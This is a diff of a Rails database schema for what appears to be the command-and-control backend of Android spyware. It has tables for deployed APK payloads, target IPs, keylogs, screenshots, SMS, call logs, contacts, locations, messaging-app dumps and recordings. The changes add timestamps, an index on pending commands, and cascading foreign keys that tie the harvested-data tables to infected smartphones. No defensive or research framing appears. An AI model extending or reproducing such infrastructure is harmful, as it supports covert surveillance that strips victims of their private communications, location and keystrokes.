@@ -10,7 +10,7 @@
 #
 # It's strongly recommended that you check this file into your version control system.
 
-ActiveRecord::Schema.define(version: 2026_02_02_212206) do
+ActiveRecord::Schema.define(version: 2026_02_05_160000) do
 
   # These are extensions that must be enabled in order to support this database
   enable_extension "plpgsql"
@@ -45,6 +45,8 @@ ActiveRecord::Schema.define(version: 2026_02_02_212206) do
     t.string "target_ip"
     t.string "status"
     t.bigint "apk_payload_id", null: false
+    t.datetime "created_at", precision: 6
+    t.datetime "updated_at", precision: 6
     t.index ["apk_payload_id"], name: "index_apk_installations_on_apk_payload_id"
   end
 
@@ -184,6 +186,7 @@ ActiveRecord::Schema.define(version: 2026_02_02_212206) do
     t.datetime "updated_at", precision: 6, null: false
     t.index ["created_at"], name: "index_pending_commands_on_created_at"
     t.index ["request_id"], name: "index_pending_commands_on_request_id", unique: true
+    t.index ["smartphone_id", "status"], name: "index_pending_commands_on_smartphone_and_status"
     t.index ["smartphone_id"], name: "index_pending_commands_on_smartphone_id"
     t.index ["status"], name: "index_pending_commands_on_status"
   end
@@ -239,9 +242,17 @@ ActiveRecord::Schema.define(version: 2026_02_02_212206) do
   end
 
   add_foreign_key "apk_installations", "apk_payloads"
+  add_foreign_key "call_logs", "smartphones", on_delete: :cascade
+  add_foreign_key "contacts", "smartphones", on_delete: :cascade
+  add_foreign_key "geo_locations", "smartphones", on_delete: :cascade
   add_foreign_key "keylog_screenshots", "smartphones"
   add_foreign_key "keylogs", "smartphones"
+  add_foreign_key "messaging_apps_dumps", "smartphones", on_delete: :cascade
   add_foreign_key "notification_media", "device_notifications"
   add_foreign_key "pending_commands", "smartphones"
+  add_foreign_key "pictures", "smartphones", on_delete: :cascade
+  add_foreign_key "recordings", "smartphones", on_delete: :cascade
+  add_foreign_key "screenshots", "smartphones", on_delete: :cascade
   add_foreign_key "smartphones", "apk_installations"
+  add_foreign_key "sms_messages", "smartphones", on_delete: :cascade
 end
